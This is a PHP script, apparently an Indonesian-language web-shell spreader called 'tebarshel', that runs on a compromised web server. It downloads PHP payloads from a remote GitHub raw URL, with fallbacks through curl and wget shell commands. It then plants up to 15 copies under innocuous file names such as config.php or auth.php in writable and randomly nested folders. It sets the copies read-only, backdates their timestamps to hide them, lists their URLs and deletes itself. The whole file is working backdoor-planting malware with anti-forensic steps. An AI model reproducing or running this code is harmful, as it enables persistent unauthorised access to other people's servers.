<?php
set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', '1');

define('MAX_SPREAD', 15);

$target_names = array(
    'index','main','default','common','user','client','server','config','setting','setup',
    'init','start','connect','service','adminpanel','session','coredata','database','access','auth',
    'module','plugin','theme','mediafile','controller','router','loader','uploader','downloader','backupdata',
    'restorepoint','staticfile','publicdata','privatefile','account','userinfo','profile','security','log','history',
    'analytics','statistics','document','editorfile','helper','vendorfile','package','library','asset','imagefile',
    'video','resourcefile','templatefile','response','request','handler','middleware','webhook','endpoint','proxyserver',
    'cloudsync','cdnfile','tempfile','cacheddata','sessionstore','token','datastream','record','report','schedule',
    'taskrunner','jobmanager','queue','eventdispatcher','listener','subscriber','notifier','alertsystem','monitor','checker',
    'updater','installer','remover','patcher','frameworkfile','phpfile','htmlfile','cssfile','jsfile','xmlfile',
    'jsondata','txtfile','markdown','readme','changelog','licensefile','apihelper','sdkfile','pluginhelper','themehelper',
    'env','credential','tokenfile','syncer','migrator','logrotate','debugfile','analyzer','heartbeat','watchdog',
    'inspector','auditor','scripter','compiler','builder','minifier','packager','resolver','verifier','authenticator',
    'validator','scanner','scannerbot','parser','jsonparser','xmlparser','csvparser','yamlparser','inihelper','formatter',
    'reformatter','converter','transcoder','translator','localizer','emailer','mailer','smtphelper','mailqueue','mailreport',
    'dashboard','panel','frontend','backend','apiendpoint','apitoken','apikey','apiuser','apiclient','apitester',
    'docgen','swaggerfile','swaggergen','postmanfile','openapifile','firewall','ruleset','whitelist','blacklist','blocklist',
    'accesslist','sessionid','sessionlock','cookiemanager','cookiehandler','csrfprotector','xssfilter','sanitizer','inputcleaner','queryfilter',
    'sqlrunner','sqlquery','dbmanager','dbschema','dbsync','dbdump','dbrestore','dbmigrate','dbconfig','dbconnector',
    'ftpfile','ftpserver','sftphelper','sshkey','sslcert','certbot','certrenew','acmefile','cronjob','cronfile',
    'scheduler','jobqueue','taskqueue','batchrunner','clihelper','cmdhelper','terminal','console','clitool','cliscript',
    'dependency','requirement','composerfile','npmfile','yarnfile','packagejson','packagelock','gitconfig','gitignore','gitrepo',
    'gitclone','gitpull','gitpush','commitlog','tagfile','releasefile','deployfile','cihelper','ciconfig','cistatus',
    'dockerset','dockerfile','containerfile','composefile','containerlog','registryfile','envvar','dotenv','envconfig','envsample',
    'portchecker','networkscan','nmapresult','portlist','ipconfig','dnschecker','whoislookup','tracefile','pingresult','latencylog',
    'uptimelog','downtimelog','statlogger','applogger','usertracker','visitlog','trafficlog','seohelper','metatags','robotsfile',
    'sitemapfile','hreflang','canonicalurl','urlmanager','slugger','permalink','urlrewriter','htaccess','nginxconf','apacheconf',
    'webconfig','iisconfig','hostfile','vhostfile','dnsrecord','nslookup','domaininfo','registrarinfo','expiration','whoisinfo',
    'cdnconfig','cloudflare','edgeserver','edgecache','originserver','loadbalancer','sslchecker','tlsverifier','certchecker','fingerprint',
    'jwtgenerator','jwtparser','jwtverifier','hashgenerator','md5hash','sha1hash','sha256hash','bcrypt','argon2','hashverifier',
    'cachecontrol','redisconfig','memcache','objectcache','pagecache','minifyjs','minifycss','compressimg','gzipfile','brotlifile',
    'imageoptimizer','imagecompressor','videoconverter','videocompressor','thumbnailer','previewer','galleryview','carouselitem','slideshow','lightbox',
    'mediaplayer','videoplayer','audioplayer','playlistfile','streamfile','streamurl','streamkey','tokenauth','securestream','hlsfile',
    'dashfile','manifestfile','livestream','vodfile','vodstream','transcoderfile','drmhelper','licensekey','serialkey','activationfile',
    'activationkey','trialchecker','licensemanager','regkeyfile','expirationfile','securitykey','pinfile','lockfile','unlocked','secured',
    'gatekeeper','firewallrule','vpnfile','sshconfig','openvpn','iptables','portsentry','netwatch','ipban','fail2ban',
    'adminaccess','superuser','rootaccess','sudofile','userprivilege','permissionfile','aclfile','groupconfig','rolefile','permissionmap'
);

$folder_prefixes = array(
    'assets','bin','cache','cdn','cloud','components','configurations','controllers','corelib','cronjobs',
    'databasefiles','datastore','defaultdata','distribution','documents','editor','environment','eventhandlers','extensions','frameworks',
    'functions','gateways','helpers','hooks','htmlfiles','images','includes','jobs','layouts','libraries',
    'locales','logs','middlewares','modules','notifications','packages','pages','plugins','private','processors',
    'profiles','public','queues','repositories','resources','routes','schedulers','scripts','securityfiles','services',
    'sessions','settings','shared','static','storages','styles','submodules','systemfiles','templates','tests',
    'themes','translations','uploads','utilities','validators','variables','vendor','views','webapps','widgets',
    'mail','migrations','assets_v2','api','clientapp','serverdata','backup','restore','devtools','hooks_v2',
    'snapshots','jobscheduler','taskqueue','debug','temp','sandbox','builds','export','import','console','cli',
    'demo','examples','samples','config_old','legacy','tools','patches','integrations','drivers','includes_v2',
    'forms','cache_v2','cdnassets','admin','dashboard','reports','reporting','analytics_v2','media','medialib',
    'thumbnails','pdfs','csvfiles','xlsx','importer','exporter','restapi','graphql','services_v2','deployments',
    'encrypt','decrypt','licenses','authsystem','firewall','loadbalancer','tokens','apikeys','userroles','permissions',
    'acl','sessions_v2','tempdata','recyclebin','maintenance','releases','nodes','clusters','distributed','failover',
    'autoscale','heartbeat','monitoring','logger','notifier_v2','messagequeue','banners','themes_v2','branding','mobile'
);

$remote_urls = [
    'https://raw.githubusercontent.com/mbnoscare/areaterlarang/refs/heads/main/kuxrin.php',
    'https://raw.githubusercontent.com/mbnoscare/areaterlarang/refs/heads/main/tunnel.php',
    'https://raw.githubusercontent.com/mbnoscare/areaterlarang/refs/heads/main/tunnel2.php',
];

function fetchContents($urls) {
    $out = [];
    foreach ($urls as $url) {
        $content = @file_get_contents($url);
        if ($content && strlen($content) > 10) {$out[] = $content; continue;}
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            $content = curl_exec($ch);
            curl_close($ch);
            if ($content && strlen($content) > 10) {$out[] = $content; continue;}
        }
        $f = @fopen($url, 'r');
        if ($f) {
            $content = '';
            while (!feof($f)) $content .= fread($f, 1024);
            fclose($f);
            if (strlen($content) > 10) {$out[] = $content; continue;}
        }
        $headers = @get_headers($url);
        if ($headers && strpos($headers[0], '200') !== false) {
            $content = @file_get_contents($url);
            if ($content && strlen($content) > 10) {$out[] = $content; continue;}
        }
        $content = @shell_exec("curl -s '$url'");
        if ($content && strlen($content) > 10) {$out[] = $content; continue;}
        $content = @shell_exec("wget -qO- '$url'");
        if ($content && strlen($content) > 10) {$out[] = $content; continue;}
    }
    return $out;
}

function getWritableDirsRecursive($base, $maxDepth = 3, $currentDepth = 0) {
    $writables = [];
    if ($currentDepth > $maxDepth) return [];
    $items = @scandir($base) ?: [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $base . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            @chmod($path, 0755);
            if (is_writable($path)) $writables[] = $path;
            $subdirs = getWritableDirsRecursive($path, $maxDepth, $currentDepth + 1);
            $writables = array_merge($writables, $subdirs);
        }
    }
    return $writables;
}

function randomNestedSubfolder($base, $levels) {
    global $folder_prefixes;
    $path = $base;
    for ($i = 0; $i < $levels; $i++) {
        $pf = $folder_prefixes[array_rand($folder_prefixes)];
        $sub = $pf . '-' . rand(100,999);
        $path .= DIRECTORY_SEPARATOR . $sub;
        if (!is_dir($path)) @mkdir($path, 0755, true);
    }
    return $path;
}

$base = rtrim($_SERVER['DOCUMENT_ROOT'], "\\/");
$dirs = getWritableDirsRecursive($base, 3);
shuffle($dirs);
$payloads = fetchContents($remote_urls);
if (empty($payloads)) die('Tidak ada payload yang berhasil diambil.');

$placed = 0;
foreach ($dirs as $dir) {
    if ($placed >= MAX_SPREAD) break;
    $payload = $payloads[array_rand($payloads)];
    $name = $target_names[array_rand($target_names)];
    $filename = $name . '.php';
    $depth = rand(0, 2);
    $target_dir = $depth > 0 ? randomNestedSubfolder($dir, $depth) : $dir;
    @chmod($target_dir, 0755);
    $dest = $target_dir . DIRECTORY_SEPARATOR . $filename;
    if (file_exists($dest)) continue;
    if (@file_put_contents($dest, $payload) !== false) {
        @chmod($dest, rand(0,1) ? 0444 : 0644);
        $randTime = strtotime(rand(2010,2020).'-'.rand(1,12).'-'.rand(1,28).' '.rand(0,23).':'.rand(0,59).':'.rand(0,59));
        @touch($dest, $randTime);
        $rel = str_replace($base, '', $dest);
        $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'];
        echo "<a href=\"{$proto}://{$host}" . str_replace('\\','/',$rel) . "\" target=\"_blank\">{$proto}://{$host}" . str_replace('\\','/',$rel) . "</a><br>";
        $placed++;
    }
}


// === Langkah : Hapus File tebarshel.php Sendiri ===
echo "\nScript tebarshel.php akan dihapus sendiri...\n";
if (unlink(__FILE__)) {
    echo "tebarshel-v3.php telah dihapus.\n";
} else {
    echo "Gagal menghapus tebarshel.php. Harap hapus secara manual.\n";
}
?>
